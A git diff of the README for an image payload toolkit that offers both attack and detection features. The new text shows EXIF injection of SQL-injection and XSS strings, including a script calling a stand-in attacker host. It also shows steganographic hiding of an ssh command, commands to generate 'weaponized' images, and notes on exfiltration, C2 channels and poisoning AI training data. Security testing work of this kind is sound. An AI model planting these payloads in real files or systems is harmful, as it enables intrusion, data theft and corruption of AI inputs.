@@ -1,180 +1,277 @@
-# ImagePayloadInjection
-![ImagePayloadInjection Logo](https://img.shields.io/badge/ImagePayloadInjection-IPI-red)
+# Image Payload Injection
 
-**Security Research** | **Educational** | **NOT FOR PRODUCTION** | **Penetration Testing**
+Every image accepts data beyond pixels. EXIF metadata. ICC profiles. Thumbnail caches. Steganographic channels.
 
-## So, You Trust Your Images?
-
-What if every cute puppy photo, corporate headshot, or meme you download could be executing invisible code? What if that innocuous JPEG was actually a Swiss Army knife of exploits waiting for the right parser to trigger them? This research project demonstrates exactly how that could happen.
-
-ImagePayloadInjection (IPI) shows how easily image files disguised as something innocent (like a "family vacation photo") could actually be silently executing code while your system thinks it's just rendering pixels. One click to view that harmless image could trigger a process you never authorized.
-
-This educational demonstration reveals the concerning ease with which trusted image formats can conceal malicious payloads, bypass security filters, and execute operations without obvious detection.
-
-## Author's Note
-
-This project emerged from the unexpected intersection of my work as a fashion photographer for high-end clients and my recent experience in red team penetration testing. Working with thousands of images daily in the photography world while simultaneously exploring security vulnerabilities created a unique perspective on how visual media can become an attack vector. 
-
-This is very much a work in progress, and I wanted to share this code with the security community as it develops. The latest additions include enhanced detection capabilities for SVG JavaScript injections, RAW camera file analysis, color histogram anomaly detection, machine learning-based pattern recognition, a new web interface, sanitizer improvements for multiple formats, and CMS integration options.
-
-## ⚠️ IMPORTANT DISCLAIMER
-
-This project is strictly for educational purposes in a controlled red team environment. Don't be that person who uses this irresponsibly. Seriously.
-
-**DO NOT**:
-- Deploy this in production environments
-- Use on non-consenting systems
-- Use for any malicious purposes
-- Distribute outside of the educational context
-
-## What This Thing Actually Does
-
-ImagePayloadInjection masquerades as a simple image manipulation toolkit (because who doesn't need to analyze some photos?), but behind its innocent facade lurks a security research tool that demonstrates how weaponized images can:
-
-- Execute arbitrary code when processed by vulnerable parsers
-- Bypass AI safety filters through invisible triggers
-- Establish covert persistence through everyday image assets
-- All while security tools report "clean" on what appears to be just another JPEG
-
-## Technical Capabilities & Attack Surface
-
-The toolkit implements several advanced pen-testing techniques:
-
-- **Format Structure Manipulation**: Exploiting the flexibility in image format specifications
-- **Metadata Injection**: Weaponizing the metadata fields for code execution
-- **Parser Exploitation**: Targeting common vulnerabilities in image processing libraries
-- **Steganographic Concealment**: Hiding payloads in visual data imperceptible to humans
-- **Polyglot File Creation**: Generating files that are valid in multiple formats simultaneously
-- **Encoding Layer Attacks**: Manipulating compression algorithms to hide malicious content
-- **Evasion Techniques**: Bypassing common detection methods and signature-based scanning
-- **SVG JavaScript Detection**: Finding and analyzing potentially malicious JavaScript in SVG files
-- **RAW File Analysis**: Examining camera RAW files for hidden code or unusual patterns
-- **ML-Based Detection**: Leveraging machine learning to identify anomalous patterns in images
-- **Color Histogram Analysis**: Detecting statistical anomalies that may indicate steganography
-
-## For Security Researchers & Bug Bounty Hunters
-
-If you're not finding security holes in image processing systems, you're missing out on some seriously low-hanging fruit. This codebase demonstrates techniques relevant to:
-
-- Image parser security auditing
-- AI/ML model security assessment
-- Content Delivery Network security
-- Data exfiltration prevention strategies
-- Format specification vulnerabilities
-
-The implementation includes intentional "security findings" that would be valuable discoveries in bug bounty programs. Think of it as your personal CTF challenge.
-
-## Blue Team Defense Scenarios
-
-For the defenders out there (bless your thankless souls), this project implements several interactive teaching scenarios:
-
-### Image Processing Chain Monitoring
-
-The toolkit demonstrates how malicious images can exploit parsers by:
-
-- Targeting specific parser implementation bugs
-- Creating multi-stage payloads that evade detection
-- Exploiting automatic format conversion processes
-- Leveraging interpreter behavior differences
-
-**Blue Team Defense**: Implement sandboxed image processing with strict format validation and disable unnecessary format features.
-
-### Image Sanitization Techniques
-
-Interactive scenarios show how defenders can protect their systems:
-
-- The importance of metadata stripping
-- Format normalization approaches
-- Content re-encoding strategies
-- Detecting anomalous format structures
-
-**Blue Team Defense**: Develop and deploy image sanitization pipelines for all user-submitted content.
-
-### AI System Protection
-
-The toolkit demonstrates how AI systems can be compromised:
-
-- Triggering unexpected behavior in image recognition models
-- Exploiting training data poisoning vectors
-- Using adversarial techniques to bypass safety filters
-- Hiding malicious payloads in areas humans won't notice
-
-**Blue Team Defense**: Implement robust pre-processing pipelines for all AI system inputs and use canary detection for unexpected behaviors.
-
-## Interactive Training Mode
-
-For educational purposes, the toolkit includes a special "Training Mode" that:
-
-- Shows real-time notifications when vulnerability points are triggered
-- Provides explanations of how each vulnerability works
-- Suggests defensive measures for each attack vector
-- Demonstrates how proper security boundaries prevent exploitation
-
-This allows security teams to safely experience how these vulnerabilities manifest without actual exploitation.
-
-## Quick Demonstration
-
-```bash
-# Install the toolkit
-pip install modern-ipi
-
-# Analyze a seemingly innocent image
-ipi scan path/to/cute_cat.jpg
-
-# 🚨 OUTPUT:
-# [CRITICAL] Found executable shellcode in ICC color profile
-# [CRITICAL] Detected pattern matching CVE-2023-21036
-# [WARNING] PNG chunk anomalies consistent with steganographic payload
-```
-
-## Latest Enhancements (May 2025)
-
-This project continues to evolve with several new capabilities:
-
-### Enhanced Detection Capabilities
-- SVG JavaScript analysis for identifying malicious scripts embedded in vector graphics
-- RAW camera file analysis for detecting tampering or hidden payloads in professional image files
-- Color histogram anomaly detection to identify statistical patterns consistent with steganography
-- Machine learning-based detection trained on known payload patterns
-
-### Improved Sanitization
-- Expanded support for additional image formats including WebP, AVIF, and camera RAW files
-- Deep sanitization options that normalize pixel data to remove potential steganographic content
-- Format-specific sanitization techniques targeting known vulnerability points
-
-### Web Interface & Integration
-- Browser-based analysis and sanitization interface for convenient usage
-- Real-time visualization of detected anomalies in images
-- Report generation with detailed findings and risk assessment
-- WordPress plugin integration for automatic media library scanning
-
-### CMS Integration
-- WordPress plugin for automatic scanning of uploaded media assets
-- Configurable risk thresholds and automated sanitization options
-- Batch scanning capabilities for existing media libraries
-
-## Implementation Note
-
-This repository contains:
-
-**Working Code**:
-- Image format analysis functionality
-- Payload injection demonstrations
-- Forensic examination tools
-
-**Educational Demonstrations**:
-- Parser vulnerability simulations
-- Detection evasion techniques (non-functional demonstration)
-
-The toolkit focuses on demonstrating detection capabilities rather than implementing actual exploits. All potentially sensitive operations are simulated for educational purposes.
-
-## The Real Lesson Here
-
-The next time you casually download an image from the internet or process user-submitted photos, remember this project and think twice. Your system's integrity will thank you.
-
-## License & Ethical Guidelines
-
-This code adheres to responsible disclosure principles and is provided for educational purposes only under controlled conditions. Don't make me regret sharing this.
+**Every parser = potential exploit.**
 
 ---
-© 2025 Modern Dime Security Research. **FOR EDUCATIONAL PURPOSES ONLY.**
+
+## What It Does
+
+**Metadata injection:** Arbitrary code in EXIF fields. Most apps parse without validation.
+
+**Steganography:** Hide payloads in pixel data. LSB manipulation. Invisible to eye, readable by decoder.
+
+**Parser exploits:** Buffer overflows in libpng, libjpeg, RAW parsers. Legacy C/C++ code.
+
+**Polyglot files:** Valid image + valid script. Dual-format attacks.
+
+---
+
+## Installation
+
+```bash
+git clone https://github.com/ghostintheprompt/image-payload-injection
+cd image-payload-injection
+pip install -r requirements.txt
+```
+
+**Requirements:**
+- Python 3.8+
+- PIL/Pillow
+- numpy, opencv-python
+- Optional: rawpy (RAW analysis), scikit-learn (ML detection)
+
+---
+
+## Quick Start
+
+**Analyze image:**
+```bash
+ipi scan suspicious_image.jpg
+```
+
+**Inject metadata payload:**
+```python
+from ipi import ImageAnalyzer
+
+analyzer = ImageAnalyzer('target.jpg')
+analyzer.inject_exif('Artist', '<script>payload</script>')
+analyzer.save('weaponized.jpg')
+```
+
+**Extract hidden data:**
+```python
+from ipi import ImageAnalyzer
+
+analyzer = ImageAnalyzer('innocent.png')
+hidden = analyzer.extract_steganography()
+```
+
+---
+
+## Features
+
+### Metadata Injection
+EXIF fields accept arbitrary data. Artist field often displayed by galleries. Comment field parsed by AI analyzers.
+
+```python
+# Inject into EXIF
+exif[0x013B] = "'; DROP TABLE users; --"
+exif[0x9286] = "<script>fetch('attacker.com')</script>"
+```
+
+Social platforms display photographer credits without sanitization. AI content analyzers trust Comment field input.
+
+### Steganography
+Hide data in image pixels. Least significant bit manipulation.
+
+```python
+# LSB steganography
+from ipi import StegoHide
+
+stego = StegoHide('cover.png')
+stego.hide_data('ssh root@server.com -p 2222')
+stego.save('shared_on_social.png')
+```
+
+**Use cases:**
+- Exfiltrate data through firewalls
+- C2 channels via public images
+- Watermark bypass
+
+### Parser Exploits
+Image parsers are complex C/C++ codebases. Buffer overflows. Integer overflows. Heap corruption.
+
+**PNG chunk overflow:**
+```
+Normal chunk: [Length: 13][Type: IHDR][Data: 13 bytes]
+Malicious:    [Length: 13][Type: IHDR][Data: 5000 bytes]
+                                        ↑ Buffer overflow
+```
+
+Parser allocates 13 bytes. Reads 5000. Overflows buffer. Code execution.
+
+**RAW parsers worse:**
+- Proprietary formats (CR2, NEF, ARW)
+- Less scrutiny than JPEG/PNG
+- Trusted by professionals
+- Parsed by Lightroom, Photoshop, Bridge
+
+### Detection Capabilities
+- SVG JavaScript analysis
+- RAW file tampering detection
+- Color histogram anomaly detection
+- ML-based pattern recognition
+- Format structure validation
+
+---
+
+## Attack Vectors
+
+### Social Media
+Images bypass content filters. Look innocent. Reach millions.
+
+Platforms strip some metadata. Keep some. Transform through parsers. All attack surface.
+
+### AI Training Datasets
+Scraped web images. Millions ingested without sanitization. Poison the dataset. Affect model behavior.
+
+### E-commerce/Dating Apps
+Product photos. Profile pictures. All parsed. All transformed. C2 channels hidden in plain sight.
+
+### Photography Workflows
+50MB+ RAW files. 500+ per shoot. Sent to retouchers. Published to agencies. Archived in cloud. Parsed automatically.
+
+One weaponized RAW in batch of 500. Gets processed. No validation.
+
+---
+
+## For Red Teams
+
+Test image upload endpoints. Check metadata survival. Look for parser versions.
+
+RAW files get less scrutiny than JPEGs. Proprietary formats. Complex parsers. High-value targets.
+
+**Integration:**
+```bash
+# Scan upload endpoint
+ipi scan --url https://target.com/upload
+
+# Generate weaponized image
+ipi create --payload xss --output weaponized.jpg
+
+# Test parser
+ipi fuzz --parser /usr/lib/libpng.so
+```
+
+---
+
+## For Blue Teams
+
+Strip all metadata before publishing. Validate dimensions vs file size. Sandbox image processing.
+
+Multi-layer detection: content + timing + volume + protocol analysis.
+
+**Defense:**
+```bash
+# Sanitize image
+ipi sanitize input.jpg --output clean.jpg
+
+# Batch scan
+ipi scan --directory ./uploads --recursive
+
+# CMS integration
+ipi wordpress-scan --library /var/www/wp-content/uploads
+```
+
+---
+
+## Web Interface
+
+Browser-based analysis and sanitization:
+
+```bash
+python -m ipi.web_interface
+# Access: http://localhost:5000
+```
+
+Features:
+- Real-time visualization
+- Risk assessment reports
+- Batch processing
+- CMS integration
+
+---
+
+## Technical Details
+
+**Supported formats:**
+- JPEG (EXIF, JFIF, IPTC)
+- PNG (chunk manipulation, tEXt/zTXt)
+- TIFF (IFD structure exploits)
+- RAW (CR2, NEF, ARW metadata)
+- GIF (comment block injection)
+- SVG (JavaScript detection)
+- WebP, AVIF (modern formats)
+
+**Attack techniques:**
+- LSB steganography
+- EXIF injection
+- Chunk overflow
+- Polyglot files
+- ICC profile injection
+
+**Detection methods:**
+- Format structure validation
+- Statistical anomaly detection
+- ML-based pattern matching
+- Metadata forensics
+
+---
+
+## Use Cases
+
+**Authorized pentesting:** Client networks with image processing. Test upload endpoints. Parser version disclosure.
+
+**Security research:** Parser vulnerability discovery. Format specification analysis. Detection bypass techniques.
+
+**Defense development:** Blue team training. Understanding attacker techniques. Building better detection.
+
+---
+
+## Don't Be Stupid
+
+**Unauthorized use = federal prison.** CFAA violation. Real consequences.
+
+**No authorization = don't use this tool.** Period.
+
+For red teams testing defenses. Not criminals.
+
+You need: Written authorization. Defined scope. Professional engagement or research environment.
+
+---
+
+## Why This Exists
+
+Fashion photographers send RAW files everywhere. Email. WeTransfer. Dropbox. Clients parse blindly.
+
+Built this after watching the same files that document fabric potentially document infrastructure.
+
+Images are data structures parsed by code. Code has bugs. Bugs become exploits.
+
+---
+
+## Latest Updates (Feb 2026)
+
+- Python 3.13 compatibility
+- Enhanced SVG JavaScript detection
+- RAW file deep analysis
+- ML-based anomaly detection
+- WordPress plugin integration
+- Expanded format support (WebP, AVIF)
+- Real-time web interface
+
+---
+
+## License
+
+MIT License. Educational purposes only.
+
+---
+
+**[github.com/ghostintheprompt/image-payload-injection](https://github.com/ghostintheprompt/image-payload-injection)**
+
+Metadata injection. Steganography. Parser exploits.
+
+Authorized pentests only. Written permission required. Don't be stupid.
